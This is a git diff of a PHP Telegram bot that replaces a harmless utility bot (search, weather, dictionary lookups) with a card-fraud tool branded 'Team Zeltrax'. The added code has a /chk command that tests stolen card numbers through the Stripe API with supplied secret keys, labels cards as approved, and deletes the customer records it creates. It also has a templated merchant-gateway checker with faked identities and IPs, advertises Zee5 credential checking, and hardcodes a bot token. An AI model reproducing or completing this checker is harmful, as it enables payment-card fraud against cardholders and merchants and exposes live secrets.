@@ -1,346 +1,620 @@
 <?php
-    date_default_timezone_set("Asia/kolkata");
-    //Data From Webhook
-    $content = file_get_contents("php://input");
-    $update = json_decode($content, true);
-    $chat_id = $update["message"]["chat"]["id"];
-    $message = $update["message"]["text"];
-    $id = $update["message"]["from"]["id"];
-    $username = $update["message"]["from"]["username"];
-    $firstname = $update["message"]["from"]["first_name"];
-    $bot_name = "" ;//your bot name
- /// for broadcasting in Channel
-$channel_id = "-100xxxxxxxxxx"; 
 
-    //Extact match Commands
-    if($message == "/start"){
-        send_message($chat_id, "Hi, $firstname\nUse /cmds to view commands. \nBot owner: @izukuuuuu");
-    }
+////////////////=============[Zeltrax Bot Raw]=============////////////////
+////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////
 
-    if($message == "/cmds"){
-        send_message($chat_id, "
-          /search <input> (Google search)
-          \n/syt <query> (Youtube Search)
-          \n/dict <word> (Dicitonary)
-          \n/smirror <name> (Search Movies/Series)
-          \n/bin <bin> (Bin Data)
-          \n/weather <name of your city> (Current weather Status)
-          \n/dice (random 1-6)
-          \n/date (today's date)
-          \n/time (current time)
-          \n/git <username>
-          \n/info (User Info)
-          \n/donate (Donate to Creator)
-          ");
-    }
+$botToken = "1648033660:AAF9nXZw-OfigGvbCb6cmZ-704XdhTMj3RA"; // Enter ur bot token
+$website = "https://api.telegram.org/bot".$botToken;
+error_reporting(0);
+$update = file_get_contents('php://input');
+$update = json_decode($update, TRUE);
+$print = print_r($update);
+$chatId = $update["message"]["chat"]["id"];
+$gId = $update["message"]["from"]["id"];
+$userId = $update["message"]["from"]["id"];
+$firstname = $update["message"]["from"]["first_name"];
+$username = $update["message"]["from"]["username"];
+$message = $update["message"]["text"];
+$message_id = $update["message"]["message_id"];
 
-    if($message == "/dice"){
-        sendDice($chat_id, "🎲");
-    }
-    if($message == "/date"){
-        $date = date("d/m/y");
-        send_message($chat_id, $date);
-    }
-   if($message == "/time"){
-        $time = date("h:i a", time());
-        send_message($chat_id, $time);
-    }
-    
-     if($message == "/info"){
-        send_message($chat_id, "User Info \nName: $firstname\nID:$id \nUsername: @$username");
-    }
+//////////=========[Start Command]=========//////////
 
-if($message == "/help"){
-        send_message($chat_id, "Contact @Reboot13");
-    }
-if($message == "/donate"){
-        send_message($chat_id, "https://reboot13.hashnode.dev/donate");
-    }
-
-///Commands with text
-
-
-    //Google Search
-if (strpos($message, "/search") === 0) {
-        $search = substr($message, 8);
-         $search = preg_replace('/\s+/', '+', $search);
-    if ($search != null) {
-     send_message($chat_id, "https://www.google.com/search?q=".$search);
-    }
-  }
-
-//World Mirror Search
-if (strpos($message, "/smirror") === 0) {
-$smovie = substr($message, 9);
-$smovie = preg_replace('/\s+/', '+', $smovie);
-$murl = "[Results-Go to World Mirror](https://witcher.lalbaake456.workers.dev/0:search?q=$smovie)";
-if ($smovie != null) {
-  send_MDmessage($chat_id, $murl);
-}
+if (strpos($message, "/start") === 0){
+sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
 }
 
-//Youtube Search
-if (strpos($message, "/syt") === 0) {
-$syt = substr($message, 5);
-$syt = preg_replace('/\s+/', '+', $syt);
-$yurl = "[Open Youtube](https://www.youtube.com/results?search_query=$syt)";
-if ($syt != null) {
-  send_MDmessage($chat_id, $yurl);
-}
+//////////=========[Cmds Command]=========//////////
+
+elseif (strpos($message, "/cmds") === 0){
+sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_TeamZeltrax%0A<u>Merchant CC Checker:</u> <code>/chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/schk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Zee5 Checker:</u> <code>/zee5</code> Email:Pass%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
 }
 
+//////////=========[Info Command]=========//////////
 
-///Channel BroadCast
-if (strpos($message, "/broadcast") === 0) {
-$broadcast = substr($message, 11);
-// id == (admins user id)
-if ($id == 1171876903 || $id == 1478297206 || $id == 654455829 || $id == 638178378 ) {
-  send_Cmessage($channel_id, $broadcast);
-}
+elseif (strpos($message, "/info") === 0){
+sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
 }
 
+//////////=========[Bin Command]=========//////////
 
-//Bin Lookup
-   if(strpos($message, "/bin") === 0){
-        $bin = substr($message, 5);
-   $curl = curl_init();
-   curl_setopt_array($curl, [
-  CURLOPT_URL => "https://lookup.binlist.net/".$bin,
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_FOLLOWLOCATION => true,
-  CURLOPT_ENCODING => "",
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => "GET",
-  CURLOPT_HTTPHEADER => [
-    "authority: lookup.binlist.net",
-    "accept: application/json",
-    "accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
-    "origin: https://binlist.net",
-    "https://binlist.net/",
-    "sec-fetch-dest: empty",
-    "sec-fetch-site: same-site"
-  ],
-]);
-
-$result = curl_exec($curl);
-curl_close($curl);
-$data = json_decode($result, true);
-$bank = $data['bank']['name'];
-$country = $data['country']['alpha2'];
-$currency = $data['country']['currency'];
-$emoji = $data['country']['emoji'];
-$scheme = $data['scheme'];
-$Brand = $data['brand'];
-$type = $data['type'];
-  if ($scheme != null) {
-        send_message($chat_id, "
-    Bin: $bin
-Type: $scheme
-Brand : $Brand
-Bank: $bank
-Country: $country $emoji
-Currency: $currency
-Credit/Debit:$type
-Checked By @$username ");
-    }
-else {
-    send_message($chat_id, "Enter Valid BIN");
+elseif (strpos($message, "/bin") === 0){
+$bin = substr($message, 5);
+function GetStr($string, $start, $end){
+$str = explode($start, $string);
+$str = explode($end, $str[1]);  
+return $str[0];
+};
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Host: lookup.binlist.net',
+'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+$fim = curl_exec($ch);
+$bank = GetStr($fim, '"bank":{"name":"', '"');
+$name = GetStr($fim, '"name":"', '"');
+$brand = GetStr($fim, '"brand":"', '"');
+$country = GetStr($fim, '"country":{"name":"', '"');
+$scheme = GetStr($fim, '"scheme":"', '"');
+$type = GetStr($fim, '"type":"', '"');
+if(strpos($fim, '"type":"credit"') !== false){
+$bin = 'Credit';
+}else{
+$bin = 'Debit';
+};
+sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>', $message_id);
 }
-   }
-    
 
-    //Wheather API
-if(strpos($message, "/weather") === 0){
-        $location = substr($message, 9);
-   $curl = curl_init();
-   curl_setopt_array($curl, [
-CURLOPT_URL => "http://api.openweathermap.org/data/2.5/weather?q=$location&appid=89ef8a05b6c964f4cab9e2f97f696c81",
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_FOLLOWLOCATION => true,
-  CURLOPT_ENCODING => "",
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 50,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => "GET",
-  CURLOPT_HTTPHEADER => [
-    "Accept: */*",
-        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
-        "Host: api.openweathermap.org",
-        "sec-fetch-dest: empty",
-    "sec-fetch-site: same-site"
-  ],
-]);
+//////////=========[Chk Command]=========//////////
 
-
-$content = curl_exec($curl);
-curl_close($curl);
-$resp = json_decode($content, true);
-
-$weather = $resp['weather'][0]['main'];
-$description = $resp['weather'][0]['description'];
-$temp = $resp['main']['temp'];
-$humidity = $resp['main']['humidity'];
-$feels_like = $resp['main']['feels_like'];
-$country = $resp['sys']['country'];
-$name = $resp['name'];
-$kelvin = 273;
-$celcius = $temp - $kelvin;
-$feels = $feels_like - $kelvin;
-
-if ($location = $name) {
-        send_message($chat_id, "
-    Weather at $location: $weather
-Status: $description
-Temp : $celcius °C
-Feels Like : $feels °C
-Humidity: $humidity
-Country: $country 
-Checked By @$username ");
+elseif (strpos($message, "/chk") === 0){
+$lista = substr($message, 5);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mon   = $i[1];
+$year  = $i[2];
+$year1 = substr($yyyy, 2, 4);
+$cvv   = $i[3];
+error_reporting(0);
+date_default_timezone_set('Asia/Jakarta');
+if ($_SERVER['REQUEST_METHOD'] == "POST"){
+extract($_POST);
 }
-else {
-           send_message($chat_id, "Invalid City");
+elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
+extract($_GET);
 }
-    }
+function GetStr($string, $start, $end){
+$str = explode($start, $string);
+$str = explode($end, $str[1]);  
+return $str[0];
+};
+$separa = explode("|", $lista);
+$cc = $separa[0];
+$mon = $separa[1];
+$year = $separa[2];
+$cvv = $separa[3];
 
-///Github User API
-if(strpos($message, "/git") === 0){
-  $git = substr($message, 5);
-   $curl = curl_init();
-   curl_setopt_array($curl, [
-CURLOPT_URL => "https://api.github.com/users/$git",
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_FOLLOWLOCATION => true,
-  CURLOPT_ENCODING => "",
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 50,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => "GET",
-  CURLOPT_HTTPHEADER => [
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "Accept-Encoding: gzip, deflate, br",
-    "Accept-Language: en-GB,en;q=0.9",
-    "Host: api.github.com",
-    "Sec-Fetch-Dest: document",
-    "Sec-Fetch-Mode: navigate",
-    "Sec-Fetch-Site: none",
-    "Sec-Fetch-User: ?1",
-    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
-  ],
-]);
+$skeys = array(
+  1 => 'Enter ur sk keys here', // Enter at least one sk key
+//2 => 'Enter ur sk keys here',-----------------|
+//3 => 'Enter ur sk keys here',                 | Uncomment this, if you want to add more sk keys :)
+//4 => 'Enter ur sk keys here',                 |
+//5 => 'Enter ur sk keys here',-----------------|
+); 
+$skey = array_rand($skeys);
+$sk = $skeys[$skey];
 
-
-$github = curl_exec($curl);
-curl_close($curl);
-$gresp = json_decode($github, true);
-
-$gusername = $gresp['login'];
-$glink = $gresp['html_url'];
-$gname = $gresp['name'];
-$gcompany = $gresp['company'];
-$blog = $gresp['blog'];
-$gbio = $gresp['bio'];
-$grepo = $gresp['public_repos'];
-$gfollowers = $gresp['followers'];
-$gfollowings = $gresp['following'];
-
-
-if ($gusername) {
-        send_message($chat_id, "
-Name: $gname
-Username: $gusername
-Bio: $gbio
-Followers: $gfollowers
-Following : $gfollowings
-Repositories: $grepo
-Website: $blog
-Company: $gcompany
-Github url: $glink
-Checked By @$username ");
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Host: lookup.binlist.net',
+'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+$fim = curl_exec($ch);
+$bank = GetStr($fim, '"bank":{"name":"', '"');
+$name = GetStr($fim, '"name":"', '"');
+$brand = GetStr($fim, '"brand":"', '"');
+$country = GetStr($fim, '"country":{"name":"', '"');
+$scheme = GetStr($fim, '"scheme":"', '"');
+$type = GetStr($fim, '"type":"', '"');
+if(strpos($fim, '"type":"credit"') !== false){
+$bin = 'Credit';
+}else{
+$bin = 'Debit';
+};
+curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'content-Type: application/x-www-form-urlencoded',));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
+$f = curl_exec($ch);
+$info = curl_getinfo($ch);
+$time = $info['total_time'];
+$httpCode = $info['http_code'];
+$time = substr($time, 0, 4);
+$id = trim(strip_tags(GetStr($f,'"id": "','"')));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'content-Type: application/x-www-form-urlencoded',));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
+$result = curl_exec($ch);
+$info = curl_getinfo($ch);
+$time = $info['total_time'];
+$httpCode = $info['http_code'];
+$time = substr($time, 0, 4);
+$c = json_decode(curl_exec($ch), true);
+curl_close($ch);
+$pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
+$cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
+if ($c["status"] == "succeeded"){ 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
+curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
+$result = curl_exec($ch);
+curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'content-Type: application/x-www-form-urlencoded'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
+$result = curl_exec($ch);
+$attachment_to_her = json_decode(curl_exec($ch), true);
+curl_close($ch);
+$attachment_to_her;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'content-Type: application/x-www-form-urlencoded'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
+$result = curl_exec($ch);
+if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
+$skresult = "APPROVED!";
+$skresponse = "CVV MATCHES!";
+}else{
+$skresult = "UNCHECKED";
+$skresponse = "UNAVAILABLE";
+}}
+elseif(strpos($result, '"cvc_check": "pass"')){
+$skresult = "APPROVED!";
+$skresponse = "OLD CVV!";
 }
-else {
-           send_message($chat_id, "User Not Found \nInvalid github username checked by @$username");
+elseif(strpos($result, 'security code is incorrect')){
+$skresult = "APPROVED!";
+$skresponse = "CCN APPROVED!";
 }
-    }
+elseif (isset($c["error"])){
+$skresult = "DECLINED!";
+$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
+}else{
+$skresult = "UNCHECKED";
+$skresponse = "GATE FUCKED!";
+};
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
+curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
+curl_exec($ch);
+curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
+curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
+curl_exec($ch);
+curl_close($ch);
 
-///Dicitonary API
-if(strpos($message, "/dict") === 0){  
-        $dict = substr($message, 6);  
-   $curl = curl_init(); 
-   curl_setopt_array($curl, [ 
-  CURLOPT_URL => "https://api.dictionaryapi.dev/api/v2/entries/en/$dict", 
-  CURLOPT_RETURNTRANSFER => true, 
-  CURLOPT_FOLLOWLOCATION => true, 
-  CURLOPT_ENCODING => "", 
-  CURLOPT_MAXREDIRS => 10,  
-  CURLOPT_TIMEOUT => 30,  
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,  
-  CURLOPT_CUSTOMREQUEST => "GET", 
-  CURLOPT_HTTPHEADER => [ 
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",  
-        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7", 
-        "Host: oxforddictionaryapi.herokuapp.com",  
-        "Sec-Fetch-Dest: empty",  
-        "Sec-Fetch-Mode: cors", 
-        "Sec-Fetch-Site: cross-site", 
-        ],  
-]); 
+sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>', $message_id);
+}
 
+//////////=========[Conpay Command]=========//////////
 
-  $dictionary = curl_exec($curl); 
-  curl_close($curl);  
+elseif (strpos($message, "/conpay") === 0){
+$lista = substr($message, 8);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mon    = $i[1];
+$year  = $i[2];
+$cvv   = $i[3];
+error_reporting(0);
+date_default_timezone_set('Asia/Jakarta');
+if ($_SERVER['REQUEST_METHOD'] == "POST"){
+extract($_POST);
+}
+elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
+extract($_GET);
+};
 
-$out = json_decode($dictionary, true);  
-$word = $out[0]['word'];  
-$noun= $out[0]['meaning']['noun'][0]['definition']; 
-$verb = $out[0]['meaning']['verb'][0]['definition'];  
-$adjective = $out[0]['meaning']['adjective'][0]['definition'];  
-$adverb = $out[0]['meaning']['adverb'][0]['definition'];  
-$pronoun = $out[0]['meaning']['pronoun'][0]['definition'];  
+function string_between_two_string($str, $starting_word, $ending_word){ 
+$subtring_start = strpos($str, $starting_word); 
+$subtring_start += strlen($starting_word);   
+$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
+return substr($str, $subtring_start, $size);
+};
 
-if ($word = $dict) {  
-    send_message($chat_id, "  
-Word: $word   
-Noun : $noun  
-Pronoun: $pronoun   
-Verb : $verb  
-Adjective: $adjective   
-Adverb: $adverb   
-Checked By @$username "); 
-    } 
-    else {  
-        send_message($chat_id, "Invalid Input");  
-    } 
-} 
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Host: lookup.binlist.net',
+'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+$fim = curl_exec($ch);
+$bank = GetStr($fim, '"bank":{"name":"', '"');
+$name = GetStr($fim, '"name":"', '"');
+$brand = GetStr($fim, '"brand":"', '"');
+$country = GetStr($fim, '"country":{"name":"', '"');
+$scheme = GetStr($fim, '"scheme":"', '"');
+$type = GetStr($fim, '"type":"', '"');
+if(strpos($fim, '"type":"credit"') !== false){
+$bin = 'Credit';
+}else{
+$bin = 'Debit';
+};
+curl_close($ch);
 
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+if(strlen($year) == 4){
+$year = substr($year, 2);
+};
 
-     ///Send Message (Global)
-    function send_message($chat_id, $message){
-        $apiToken =  "1648033660:AAF9nXZw-OfigGvbCb6cmZ-704XdhTMj3RA";
-        $text = urlencode($message);
-        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
-    }
-    
-//Send Messages with Markdown (Global)
-      function send_MDmessage($chat_id, $message){
-       $apiToken =  "1648033660:AAF9nXZw-OfigGvbCb6cmZ-704XdhTMj3RA";
-        $text = urlencode($message);
-        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text&parse_mode=Markdown");
-    }
-    
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-///Send Message to Channel
-      function send_Cmessage($channel_id, $message){
-       $apiToken =  "1648033660:AAF9nXZw-OfigGvbCb6cmZ-704XdhTMj3RA";
-        $text = urlencode($message);
-        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$channel_id&text=$text");
-    }
+$first = ucfirst(str_shuffle('zeltrax'));
+$last = ucfirst(str_shuffle('rockz'));
+$com = ucfirst(str_shuffle('akash'));
+$email = "zeltrax".substr(md5(uniqid()),0,8)."%40gmail.com";
+$address = "".rand(0000,9999)."+Main+Street";
+$amount = "".rand(25,99)."";
+$invoice = "".rand(111111,999999)."";
+$ip = ''.rand(00,99).'.'.rand(000,999).'.'.rand(000,999).'.'.rand(00,99).''; // Your IP
+$mip = ''.rand(00,99).'.'.rand(00,99).'.'.rand(000,999).'.'.rand(00,99).''; // Merchant IP
+$ph = array("682","346","246");
+$ph1 = array_rand($ph);
+$phh = $ph[$ph1];
+$phone = "$phh".rand(0000000,9999999)."";
+$st = array("AL","NY","CA","FL","WA");
+$st1 = array_rand($st);
+$state = $st[$st1];
+if ($state == "NY"){
+$state = "New+York";
+$zip = "10080";
+$city = "New+York";
+}
+elseif ($state == "WA"){
+$state = "Washington";
+$zip = "98001";
+$city = "Auburn";
+}
+elseif ($state == "AL"){
+$state = "Alabama";
+$zip = "35005";
+$city = "Adamsville";
+}
+elseif ($state == "FL"){
+$state = "Florida";
+$zip = "32003";
+$city = "Orange+Park";
+}else{
+$state = "California";
+$zip = "90201";
+$city = "Bell";
+};
 
- function sendDice($chat_id, $message){
-       $apiToken =  "1648033660:AAF9nXZw-OfigGvbCb6cmZ-704XdhTMj3RA";
-        file_get_contents("https://api.telegram.org/bot$apiToken/sendDice?chat_id=$chat_id&emoji=$message");
-    }
+//////////////////=================[Session ID]=================//////////////////
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, '...........');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: ..............................',
+'Accept-Language: .....................',
+'Connection: ..........................',
+'Host: ................................',
+'Sec-Fetch-Dest: ......................',
+'Sec-Fetch-Mode: ......................',
+'Sec-Fetch-Site: ......................',
+'Upgrade-Insecure-Requests: ...........'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+$result1 = curl_exec($ch);
+$session = string_between_two_string($result1, '<input type="hidden" name="sessionId" value="', '"/>');
+
+//////////////////=================[Checking Cards]=================//////////////////
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, '...........');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: ..............................',
+'Accept-Language: .....................',
+'Cache-Control: .......................',
+'Connection: ..........................',
+'Content-Type: ........................',
+'Host: ................................',
+'Origin: ..............................',
+'Referer: .............................',
+'Sec-Fetch-Dest: ......................',
+'Sec-Fetch-Mode: ......................',
+'Sec-Fetch-Site: ......................',
+'Sec-Fetch-User: ......................',
+'Upgrade-Insecure-Requests: ...........'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '.....$cc and $session will be used 2 times here.....');
+
+/*
+
+$session like this:
+
+hdnfld_sessionId='.$session.'
+
+sessionId='.$session.'
+*/
+
+/*
+
+$cc like this:
+
+ssl_account_data_original='.$cc.'
+
+ssl_account_data='.$cc.'
+
+*/
+
